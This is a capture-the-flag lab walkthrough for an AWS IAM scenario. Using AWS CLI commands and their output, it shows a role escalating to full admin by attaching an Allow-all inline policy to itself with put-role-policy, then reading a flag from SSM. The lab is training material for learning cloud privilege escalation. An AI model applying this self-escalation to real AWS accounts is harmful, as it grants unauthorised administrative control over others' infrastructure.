---
title: iam-005-to-admin
tags: IAM, AWS CLI
---

![iam-005-to-admin](../../../assets/images/Pathfinding/iam-005-admin.png)

## Terraform outputs

```bash
plabs output iam-005-to-admin
{
  "attack_path": "User (pl-prod-iam-005-to-admin-starting-user) → AssumeRole → Role (pl-prod-iam-005-to-admin-starting-role) → PutRolePolicy (self) → Admin Access → ssm:GetParameter → CTF flag",
  "policy_arn": "arn:aws:iam::111111111111:policy/pl-prod-iam-005-to-admin-policy",
  "starting_role_arn": "arn:aws:iam::111111111111:role/pl-prod-iam-005-to-admin-starting-role",
  "starting_role_name": "pl-prod-iam-005-to-admin-starting-role",
  "starting_user_access_key_id": "AKIAVRUVSVUFPCJ2FDBW",
  "starting_user_arn": "arn:aws:iam::111111111111:user/pl-prod-iam-005-to-admin-starting-user",
  "starting_user_name": "pl-prod-iam-005-to-admin-starting-user",
  "starting_user_secret_access_key": "<< snip >>"
}
```

### WHOAMI

Add the AWS access key to PATH and confirm user

```bash
aws sts get-caller-identity --profile starting-user | jq
{
  "UserId": "AIDAVRUVSVUFAPN7IVNUG",
  "Account": "111111111111",
  "Arn": "arn:aws:iam::111111111111:user/pl-prod-iam-005-to-admin-starting-user"
}
```

### Assume Role

```bash
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/pl-prod-iam-005-to-admin-starting-role --role-session-name priv-escalation --profile starting-user | jq
{
  "Credentials": {
    "AccessKeyId": "ASIAVRUVSVUFHTTPFBV5",
    "SecretAccessKey": "<< snip >>",
    "SessionToken": "<< snip >>",
    "Expiration": "2026-06-01T16:41:42+00:00"
  },
  "AssumedRoleUser": {
    "AssumedRoleId": "AROAVRUVSVUFKGD7WA2BU:priv-escalation",
    "Arn": "arn:aws:sts::111111111111:assumed-role/pl-prod-iam-005-to-admin-starting-role/priv-escalation"
  }
}
```

Add the new creds to PATH and confirm user

```bash
aws sts get-caller-identity --profile assume-role | jq
{
  "UserId": "AROAVRUVSVUFKGD7WA2BU:priv-escalation",
  "Account": "111111111111",
  "Arn": "arn:aws:sts::111111111111:assumed-role/pl-prod-iam-005-to-admin-starting-role/priv-escalation"
}
```

### AWS PUT Role policy

```bash
aws iam put-role-policy --role-name pl-prod-iam-005-to-admin-starting-role --policy-name escalation-policy --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --profile assume-role
```

Confirm Escalation Policy

```bash
aws iam get-role-policy --role-name pl-prod-iam-005-to-admin-starting-role --policy-name escalation-policy --profile assume-role | jq
{
  "RoleName": "pl-prod-iam-005-to-admin-starting-role",
  "PolicyName": "escalation-policy",
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }
}
```

## Get FLAG

```bash
aws ssm describe-parameters --region us-east-1 --profile assume-role | jq
{
  "Parameters": [
    {
      "Name": "/pathfinding-labs/flags/iam-005-to-admin",
      "ARN": "arn:aws:ssm:us-east-1:111111111111:parameter/pathfinding-labs/flags/iam-005-to-admin",
      "Type": "String",
      "LastModifiedDate": "2026-06-01T11:16:34.173000-04:00",
      "LastModifiedUser": "arn:aws:iam::111111111111:user/pathfinder-prod",
      "Description": "CTF flag for the iam-005 to-admin scenario",
      "Version": 1,
      "Tier": "Standard",
      "Policies": [],
      "DataType": "text"
    }
  ]

```

```bash
aws ssm get-parameter --name "/pathfinding-labs/flags/iam-005-to-admin" --region us-east-1 --profile assume-role | jq
{
  "Parameter": {
    "Name": "/pathfinding-labs/flags/iam-005-to-admin",
    "Type": "String",
    "Value": "flag{iam_005_self_escalated}",
    "Version": 1,
    "LastModifiedDate": "2026-06-01T11:16:34.173000-04:00",
    "ARN": "arn:aws:ssm:us-east-1:111111111111:parameter/pathfinding-labs/flags/iam-005-to-admin",
    "DataType": "text"
  }
}
```